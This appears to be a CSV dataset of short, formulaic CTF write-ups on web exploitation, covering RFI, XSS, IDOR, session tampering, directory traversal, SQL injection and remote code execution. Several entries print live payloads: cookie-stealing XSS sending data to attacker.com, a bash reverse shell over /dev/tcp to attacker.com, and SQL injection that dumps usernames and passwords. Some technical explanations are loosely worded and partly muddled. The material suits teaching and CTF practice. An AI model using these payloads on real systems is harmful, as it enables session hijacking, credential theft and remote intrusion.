"filename","category","text"
"writeup_0011_tagged.txt","Web Exploitation","Title: Remote File Inclusion (RFI) Attack via URL Parameter
Primary topic: Web Exploitation
Secondary topic: Remote File Inclusion (RFI)
Tools used: None
Keywords: URL parameter, malicious file, server configuration, input validation, input/output encoding, whitelisting, blacklisting

#context
During a CTF competition, I encountered a web application that allowed users to display and download files by specifying a URL parameter. Given the potential security risks associated with URL parameters, I suspected that the application might be vulnerable to Remote File Inclusion (RFI), a type of vulnerability that allows attackers to include and execute external files on the server.

#discovery
To test for RFI, I crafted a malicious URL containing a reference to an external file, such as http://malicious-server.com/malicious.php, and submitted it to the application's URL parameter. If the application allowed the file to be included and executed on the server, it would confirm the presence of an RFI vulnerability.

#exploitation
Upon submitting the crafted URL to the application, it indeed included and executed the malicious file on the server, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the RFI vulnerability to access and execute a specific file on the server. After researching the server's configuration and available files, I crafted a suitable URL containing the desired file and submitted it to the application's URL parameter. The server successfully included and executed the file, displaying the flag for the Web Exploitation challenge.

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against RFI vulnerabilities by validating and sanitizing user input, using whitelisting and blacklisting techniques, and implementing input/output encoding. By exploiting the RFI vulnerability, I was able to include and execute external files on the server, access restricted files, and obtain the flag needed to complete the challenge.
"
"writeup_0012_tagged.txt","Web Exploitation","Title: Cross-Site Scripting (XSS) Attack via Form Input
Primary topic: Web Exploitation
Secondary topic: Cross-Site Scripting (XSS)
Tools used: None
Keywords: form input, client-side

#context
During a CTF competition, I encountered a web application that allowed users to submit information through a form input and display it on a public page. Given the potential security risks associated with form input, I suspected that the application might be vulnerable to Cross-Site Scripting (XSS), a type of vulnerability that allows attackers to inject and execute malicious scripts on the client-side.

#discovery
To test for XSS, I crafted a malicious input containing a script tag, such as <script>alert('XSS')</script>, and submitted it to the application's form input. If the application allowed the script to be injected and executed on the client-side, it would confirm the presence of an XSS vulnerability.

#exploitation
Upon submitting the crafted input to the application, it indeed injected and executed the malicious script on the client-side, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the XSS vulnerability to execute a specific script on the client-side. After researching the application's structure and available resources, I crafted a suitable payload containing a script to extract the desired information and submitted it to the application's form input. The client successfully executed the script and displayed the flag for the Web Exploitation challenge.

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against XSS vulnerabilities by validating and sanitizing user input, using input/output encoding, and implementing white-listing and blacklisting techniques. By exploiting the XSS vulnerability, I was able to inject and execute malicious scripts on the client-side, access sensitive information, and obtain the flag needed to complete the challenge.

#code
<script>alert('XSS')</script>
"
"writeup_0013_tagged.txt","Web Exploitation","Title: Insecure Direct Object Reference (IDOR) Attack via User Profile
Primary topic: Web Exploitation
Secondary topic: Insecure Direct Object Reference (IDOR)
Tools used: None
Keywords: user data, direct object reference

#context
During a CTF competition, I encountered a web application that allowed users to view and edit their profile information through a dedicated page. Given the potential security risks associated with user data, I suspected that the application might be vulnerable to Insecure Direct Object Reference (IDOR), a type of vulnerability that allows attackers to access and modify sensitive data by manipulating direct object references.

#discovery
To test for IDOR, I crafted a malicious request containing a direct object reference to another user's profile, such as http://website.com/profile?id=2, and submitted it to the application's user profile page. If the application allowed the request to access and modify the other user's sensitive information, it would confirm the presence of an IDOR vulnerability.

#exploitation
Upon submitting the crafted request to the application, it indeed accessed and displayed the other user's sensitive information, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the IDOR vulnerability to access and display a specific user's private data. After researching the application's structure and available resources, I crafted a suitable request containing a direct object reference to the desired user's profile and submitted it to the application's user profile page. The server successfully responded with the desired user's sensitive information, displaying the flag for the Web Exploitation challenge.

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against IDOR vulnerabilities by implementing proper authorization and authentication controls, using indirect object references, and performing access controls on sensitive data. By exploiting the IDOR vulnerability, I was able to access and modify sensitive data, obtain confidential information, and complete the Web Exploitation challenge.
"
"writeup_0014_tagged.txt","Web Exploitation","Title: Broken Authentication and Session Management via Cookie Manipulation
Primary topic: Web Exploitation
Secondary topic: Broken Authentication and Session Management
Tools used: None
Keywords: cookies, user authentication, session management

#context
During a CTF competition, I encountered a web application that used cookies to manage user authentication and session management. Given the potential security risks associated with cookies, I suspected that the application might be vulnerable to Broken Authentication and Session Management, a type of vulnerability that allows attackers to bypass authentication and hijack user sessions by manipulating cookies.

#discovery
To test for Broken Authentication and Session Management, I crafted a malicious request containing a manipulated cookie with an arbitrary user ID, such as Cookie: user_id=123, and submitted it to the application's login page. If the application allowed the request to bypass authentication and log in as the arbitrary user, it would confirm the presence of a Broken Authentication and Session Management vulnerability.

#exploitation
Upon submitting the crafted request to the application, it indeed bypassed authentication and logged in as the arbitrary user, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the Broken Authentication and Session Management vulnerability to hijack the session of a specific user.

#exploitation
After researching the application's structure and available resources, I crafted a suitable cookie with the session ID of the desired user and submitted it to the application. The server successfully recognized the hijacked session and responded with the flag for the Web Exploitation challenge.

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against Broken Authentication and Session Management vulnerabilities by implementing proper session management controls, using secure cookies, and validating user input. By exploiting the vulnerability, I was able to bypass authentication, hijack user sessions, and complete the Web Exploitation challenge.
"
"writeup_0015_tagged.txt","Web Exploitation","Title: Cross-Site Scripting (XSS) Attack via Contact Form
Primary topic: Web Exploitation
Secondary topic: Cross-Site Scripting (XSS)
Tools used: None
Keywords: session cookie, input validation, output encoding

#context
During a CTF competition, I encountered a web application that allowed users to contact the website administrators via a contact form. Given the potential security risks associated with user input, I suspected that the application might be vulnerable to Cross-Site Scripting (XSS), a type of vulnerability that allows attackers to inject malicious code into web pages viewed by other users.

#discovery
To test for XSS, I crafted a malicious payload containing a script that would steal the victim's session cookie, such as <script>new Image().src=""http://attacker.com/cookie?=""+document.cookie;</script>, and submitted it to the application's contact form. If the application allowed the payload to execute and steal the victim's session cookie, it would confirm the presence of an XSS vulnerability.

#exploitation
Upon submitting the crafted payload to the application, it indeed executed and stole the victim's session cookie, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the XSS vulnerability to execute a script that would display the flag.

#code
`<script>new Image().src=""http://attacker.com/cookie?=""+document.cookie;</script>`

#exploitation
After researching the application's structure and available resources, I crafted a suitable payload containing a script that would display the flag and submitted it to the application's contact form. The server successfully recognized the payload and responded with the flag for the Web Exploitation challenge.

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against XSS vulnerabilities by implementing proper input validation and output encoding controls, using secure cookies, and validating user input. By exploiting the vulnerability, I was able to steal sensitive information, execute malicious code, and complete the Web Exploitation challenge.
"
"writeup_0016_tagged.txt","Web Exploitation","Title: Directory Traversal Attack on File Upload Functionality
Primary topic: Web Exploitation
Secondary topic: Directory Traversal
Tools used: None
Keywords: file upload, payload, path traversal

#context
During a CTF competition, I encountered a web application that allowed users to upload files to the server. Given the potential security risks associated with file uploads, I suspected that the application might be vulnerable to Directory Traversal, a type of vulnerability that allows attackers to access files outside of the intended upload directory.

#discovery
To test for Directory Traversal, I crafted a malicious payload containing a path traversal sequence, such as ../, and appended it to the filename of a file that I wanted to upload, such as ../../../etc/passwd.

#exploitation
If the application allowed the payload to execute and upload the file to the server outside of the intended upload directory, it would confirm the presence of a Directory Traversal vulnerability. Upon submitting the crafted payload to the application, it indeed executed and uploaded the file to the server outside of the intended upload directory, confirming the vulnerability.

#discovery
To obtain the flag for the Web Exploitation challenge, I needed to use the Directory Traversal vulnerability to access a specific file on the server. After researching the server's file structure, I crafted a suitable payload containing the path to the desired file, such as ../../../flag.txt, and submitted it to the application's file upload functionality.

#exploitation
The server successfully recognized the payload and responded with the flag for the Web Exploitation challenge.

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against Directory Traversal vulnerabilities by implementing proper file upload controls, using secure file paths, and validating user input. By exploiting the vulnerability, I was able to access sensitive files, execute malicious code, and complete the Web Exploitation challenge.
"
"writeup_0017_tagged.txt","Web Exploitation","Title: SQL Injection in Login Functionality
Primary topic: Web Exploitation
Secondary topic: SQL Injection
Tools used: None
Keywords: user input, payload, authentication, database

#context
During a CTF competition, I encountered a web application that allowed users to login to the system. Given the potential security risks associated with user input, I suspected that the application might be vulnerable to SQL Injection, a type of vulnerability that allows attackers to manipulate SQL queries executed by the application.

#discovery
To test for SQL Injection, I crafted a malicious payload containing a SQL Injection attack string, such as ' OR 1=1 --, and submitted it to the application's login form. If the application allowed the payload to execute and bypassed the authentication process, it would confirm the presence of a SQL Injection vulnerability.

#exploitation
Upon submitting the crafted payload to the application, it indeed executed and bypassed the authentication process, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the SQL Injection vulnerability to extract sensitive information from the database.

#code
' OR 1=1 --

#exploitation
After researching the application's database structure and available resources, I crafted a suitable payload containing a SQL Injection attack string that would extract the flag from the database, such as ' UNION SELECT flag FROM flags --. The server successfully recognized the payload and responded with the flag for the Web Exploitation challenge.

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against SQL Injection vulnerabilities by implementing proper input validation and output encoding controls, using parameterized queries, and validating user input. By exploiting the vulnerability, I was able to extract sensitive information, execute malicious code, and complete the Web Exploitation challenge.
"
"writeup_0018_tagged.txt","Web Exploitation","Title: Cross-Site Scripting (XSS) Attack on Contact Form
Primary topic: Web Exploitation
Secondary topic: Cross-Site Scripting (XSS)
Tools used: None
Keywords: user input, payload

#context
During a CTF competition, I encountered a web application that allowed users to send messages to the site administrator through a contact form. Given the potential security risks associated with user input, I suspected that the application might be vulnerable to Cross-Site Scripting (XSS), a type of vulnerability that allows attackers to inject malicious scripts into a web page viewed by other users.

#discovery
To test for XSS, I crafted a malicious payload containing a JavaScript script, such as <script>alert(""XSS Attack!"")</script>, and submitted it to the application's contact form. If the application allowed the payload to execute and display the JavaScript script to other users, it would confirm the presence of an XSS vulnerability.

#exploitation
Upon submitting the crafted payload to the application, it indeed executed and displayed the JavaScript script to other users, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the XSS vulnerability to steal the session cookie of a logged-in user.

#code
<script>document.location='https://attacker.com/steal.php?cookie='+document.cookie</script>

#exploitation
After researching the application's session management and cookie handling, I crafted a suitable payload containing a JavaScript script that would extract the session cookie from a logged-in user, such as <script>document.location='https://attacker.com/steal.php?cookie='+document.cookie</script>. The server successfully recognized the payload and responded with the session cookie for the logged-in user.

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against XSS vulnerabilities by implementing proper input validation and output encoding controls, using secure cookie handling, and validating user input. By exploiting the vulnerability, I was able to steal sensitive information, execute malicious code, and complete the Web Exploitation challenge.
"
"writeup_0019_tagged.txt","Web Exploitation","Title: Broken Authentication and Session Management Attack
Primary topic: Web Exploitation
Secondary topic: Broken Authentication and Session Management
Tools used: None
Keywords: session ID, authentication, cookie handling

#context
During a CTF competition, I encountered a web application that allowed users to login to the system and manage their profiles. Given the potential security risks associated with user authentication and session management, I suspected that the application might be vulnerable to Broken Authentication and Session Management, a type of vulnerability that allows attackers to bypass authentication and hijack user sessions.

#discovery
To test for Broken Authentication and Session Management, I crafted a malicious payload containing a tampered session ID, such as 1234567890abcdef, and submitted it to the application's login form. If the application allowed the payload to execute and bypassed the authentication process, it would confirm the presence of a Broken Authentication and Session Management vulnerability.

#exploitation
Upon submitting the crafted payload to the application, it indeed executed and bypassed the authentication process, confirming the vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the Broken Authentication and Session Management vulnerability to hijack the session of a logged-in user. After researching the application's session management and cookie handling, I crafted a suitable payload containing a tampered session ID that would hijack the session of a logged-in user, such as Cookie: PHPSESSID=1234567890abcdef. The server successfully recognized the payload and responded with the session of the logged-in user.

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against Broken Authentication and Session Management vulnerabilities by using secure session management, implementing proper authentication controls, and validating user input. By exploiting the vulnerability, I was able to bypass authentication, hijack user sessions, and complete the Web Exploitation challenge.
"
"writeup_0020_tagged.txt","Web Exploitation","Title: Remote Code Execution (RCE) Attack on a Web Server
Primary topic: Web Exploitation
Secondary topic: Remote Code Execution
Tools used: None
Keywords: file uploads, PHP script, Linux command, reverse shell

#context
During a CTF competition, I encountered a vulnerable web application that allowed users to upload files to the server.

#discovery
Given the potential security risks associated with file uploads, I suspected that the application might be vulnerable to Remote Code Execution (RCE), a type of vulnerability that allows attackers to execute code on a remote server.

#exploitation
To test for RCE, I crafted a malicious payload containing a PHP script that would execute the Linux command ls -la and save the output to a file. I then uploaded the file to the application's server and waited for it to execute. Upon checking the application's upload directory, I found that the output.txt file had been created and contained the expected output of the ls -la command. This confirmed the presence of an RCE vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the RCE vulnerability to execute a reverse shell on the remote server. After researching the application's system and network configuration, I crafted a suitable payload containing a reverse shell script that would allow me to connect to the server and gain remote access.

#code
<?php echo shell_exec('ls -la > /var/www/html/uploads/output.txt'); ?>
<?php system('bash -i >& /dev/tcp/attacker.com/4444 0>&1'); ?>

#discovery
After executing the payload, I successfully gained a remote shell on the server and was able to complete the Web Exploitation challenge.

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against Remote Code Execution vulnerabilities by implementing proper input validation and output encoding controls, using secure file uploads, and validating user input. By exploiting the vulnerability, I was able to execute arbitrary code on the remote server, gain remote access, and complete the Web Exploitation challenge.
"
"writeup_0021_tagged.txt","Web Exploitation","Title: SQL Injection in Search Feature
Primary topic: Web Exploitation
Secondary topic: SQL Injection
Tools used: None
Keywords: user input, database, payload

#context
During a CTF competition, I encountered a web application that included a search feature allowing users to search for content on the website. Given the potential security risks associated with user input, I suspected that the application might be vulnerable to SQL Injection, a type of vulnerability that allows attackers to inject SQL code into a query and manipulate the database.

#discovery
To test for SQL Injection, I entered a malicious payload containing SQL code into the search box, such as ' or 1=1;--, which would cause the application to return all results, regardless of the input. Upon submitting the payload, the application returned all results, confirming the presence of an SQL Injection vulnerability.

#exploitation
To obtain the flag for the Web Exploitation challenge, I needed to use the SQL Injection vulnerability to extract sensitive information from the database. After researching the application's database structure and table names, I crafted a suitable payload containing SQL code that would extract sensitive information from the database, such as UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'users';. This payload allowed me to identify the names of columns in the 'users' table, such as 'username' and 'password', which contained the sensitive information. Using the obtained column names, I crafted a second payload containing SQL code that would extract the usernames and passwords of all users in the 'users' table, such as UNION SELECT username, password FROM users;. This payload allowed me to obtain the sensitive information required to complete the Web Exploitation challenge.

#code
`' or 1=1;--`

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against SQL Injection vulnerabilities by implementing proper input validation and output encoding controls, using prepared statements and parameterized queries, and validating user input. By exploiting the vulnerability, I was able to extract sensitive information from the database, complete the Web Exploitation challenge, and demonstrate the potential risks associated with SQL Injection.
"
